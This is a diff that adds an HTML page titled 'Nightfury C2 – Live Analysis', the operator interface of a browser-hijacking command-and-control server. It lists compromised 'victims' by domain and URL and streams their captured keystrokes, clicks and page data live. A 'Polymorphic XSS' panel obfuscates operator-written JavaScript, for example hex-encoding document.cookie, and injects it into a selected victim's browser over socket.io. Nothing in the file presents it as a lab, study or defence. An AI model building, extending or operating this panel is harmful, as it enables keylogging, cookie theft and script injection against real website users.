@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nightfury C2 – Live Analysis</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { 
+            background: #0a0a0a; 
+            color: #00ff41; 
+            font-family: 'JetBrains Mono', 'Courier New', monospace; 
+            margin: 0; 
+            padding: 20px; 
+            display: flex; 
+            height: 100vh; 
+            overflow: hidden;
+        }
+        .sidebar { 
+            width: 320px; 
+            background: #0d0d0d; 
+            border-right: 1px solid #00ff4133; 
+            overflow-y: auto; 
+            padding: 20px; 
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .main { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            padding: 20px; 
+            gap: 20px;
+        }
+        .stream { 
+            flex: 1; 
+            overflow-y: auto; 
+            background: #050505; 
+            border: 1px solid #00ff4122; 
+            padding: 15px; 
+            border-radius: 4px;
+            box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.05);
+        }
+        .victim { 
+            cursor: pointer; 
+            padding: 12px; 
+            margin-bottom: 10px; 
+            background: #151515; 
+            border-left: 4px solid #00ff41; 
+            border-radius: 2px;
+            transition: all 0.2s ease;
+        }
+        .victim:hover {
+            background: #1a1a1a;
+            transform: translateX(5px);
+        }
+        .victim.selected { 
+            background: #00ff4111; 
+            border-left-color: #ffaa00; 
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.1);
+        }
+        .log { 
+            border-bottom: 1px solid #00ff4111; 
+            padding: 10px 0; 
+            font-size: 11px; 
+            white-space: pre-wrap; 
+            animation: fadeIn 0.3s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .xss-box { 
+            background: #1a1a1a; 
+            padding: 15px; 
+            border-radius: 4px;
+            border: 1px solid #00ff4122;
+        }
+        textarea { 
+            width: 100%; 
+            background: #000; 
+            color: #00ff41; 
+            border: 1px solid #00ff4144; 
+            font-family: inherit; 
+            padding: 10px;
+            font-size: 12px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+            outline: none;
+        }
+        textarea:focus {
+            border-color: #00ff41;
+        }
+        button { 
+            background: #00ff41; 
+            color: #000; 
+            border: none; 
+            padding: 8px 15px; 
+            cursor: pointer; 
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 1px;
+            width: 100%;
+            transition: all 0.2s;
+        }
+        button:hover {
+            background: #00cc33;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+        .key { color: #ffaa00; font-weight: bold; }
+        .click { color: #ff6600; font-weight: bold; }
+        .dom { color: #00ccff; font-weight: bold; }
+        h3, h4 { 
+            margin: 0 0 15px; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
+            font-size: 14px;
+            color: #00ff41;
+            border-bottom: 1px solid #00ff4133;
+            padding-bottom: 5px;
+        }
+        .status-tag {
+            font-size: 9px;
+            padding: 2px 5px;
+            background: #00ff4122;
+            border-radius: 2px;
+            margin-top: 5px;
+            display: inline-block;
+        }
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #00ff4133;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #00ff4166;
+        }
+    </style>
+</head>
+<body>
+<div class="sidebar custom-scrollbar">
+    <h3>Victims (<span id="victimCount">0</span>)</h3>
+    <div id="victimList"></div>
+    
+    <div class="xss-box">
+        <h4>Polymorphic XSS</h4>
+        <textarea id="xssCode" rows="6" placeholder="alert(document.cookie)"></textarea>
+        <button id="injectBtn">Inject to Selected</button>
+    </div>
+</div>
+
+<div class="main">
+    <h3>Live Exfiltration Stream</h3>
+    <div class="stream custom-scrollbar" id="logContainer"></div>
+</div>
+
+<script>
+    const socket = io();
+    let selectedVictim = null;
+
+    socket.on('connect', () => {
+        console.log('Connected to C2 server');
+    });
+
+    socket.on('victims', (victims) => {
+        const container = document.getElementById('victimList');
+        document.getElementById('victimCount').innerText = victims.length;
+        container.innerHTML = victims.map(v => `
+            <div class="victim ${selectedVictim === v.id ? 'selected' : ''}" data-id="${v.id}">
+                <div style="font-weight: bold; font-size: 12px;">${v.domain || 'Unknown'}</div>
+                <div style="font-size: 10px; color: #00ff4188; overflow: hidden; text-overflow: ellipsis;">${v.url || ''}</div>
+                <div class="status-tag">ID: ${v.id.substr(0, 8)}...</div>
+            </div>
+        `).join('');
+        
+        document.querySelectorAll('.victim').forEach(el => {
+            el.onclick = () => {
+                document.querySelectorAll('.victim').forEach(c => c.classList.remove('selected'));
+                el.classList.add('selected');
+                selectedVictim = el.dataset.id;
+            };
+        });
+    });
+
+    socket.on('exfil', (data) => {
+        const logDiv = document.getElementById('logContainer');
+        const entry = document.createElement('div');
+        entry.className = 'log';
+        let typeClass = '';
+        if (data.type === 'click') typeClass = 'click';
+        if (data.type === 'key') typeClass = 'key';
+        if (data.type === 'dom') typeClass = 'dom';
+        
+        const timestamp = new Date(data.timestamp).toLocaleTimeString();
+        const payloadStr = typeof data.payload === 'object' ? JSON.stringify(data.payload, null, 2) : data.payload;
+        
+        entry.innerHTML = `
+            <div style="margin-bottom: 5px;">
+                <strong class="${typeClass}">[${timestamp}] ${data.domain || 'Unknown'}</strong>
+                <span style="color: #00ff4144; font-size: 9px; margin-left: 10px;">SID: ${data.socketId.substr(0, 6)}</span>
+            </div>
+            <div style="color: #00ff41cc; padding-left: 10px; border-left: 1px solid #00ff4122;">${payloadStr}</div>
+        `;
+        logDiv.prepend(entry);
+        
+        // Limit logs to prevent browser lag
+        if (logDiv.children.length > 500) {
+            logDiv.removeChild(logDiv.lastChild);
+        }
+    });
+
+    document.getElementById('injectBtn').onclick = () => {
+        if (!selectedVictim) return alert('Select a victim from the list first.');
+        let script = document.getElementById('xssCode').value;
+        if (!script) return;
+        
+        // Basic polymorphism: random variable names, encode strings
+        // This is a simple example of obfuscation
+        const obfuscated = script
+            .replace(/alert/g, 'eval')
+            .replace(/document\.cookie/g, `'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x63\\x6f\\x6f\\x6b\\x69\\x65'`);
+            
+        socket.emit('inject', { targetId: selectedVictim, script: obfuscated });
+        console.log('Injected script to:', selectedVictim);
+    };
+</script>
+</body>
+</html>
